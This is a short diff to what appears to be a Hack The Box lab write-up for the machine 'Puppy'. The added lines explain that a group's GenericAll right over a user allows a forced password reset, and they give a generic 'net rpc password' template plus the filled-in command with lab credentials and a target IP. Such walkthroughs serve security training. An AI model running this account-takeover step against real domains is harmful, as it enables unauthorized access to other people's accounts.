@@ -320,4 +320,13 @@ ANT.EDWARDS@PUPPY.HTB
 ```
 Anthony is a member of `Senior Devs` group
 ![[Puppy08.png]]
-Now checking the `Senior Devs` Group
+Now checking the `Senior Devs` Group, It has outbound access control `GenericALL` on User `Adam` which means we can Force change the password of `Adam`.
+![[Puppy09.png]]
+We can use RPC command to do that 
+```bash
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+```
+End command
+```bash
+net rpc password "ADAM.SILVER" "nopass@123" -U "puppy.htb"/"ANT.EDWARDS@PUPPY.HTB"%"Antman2025!" -S 10.10.11.70
+```
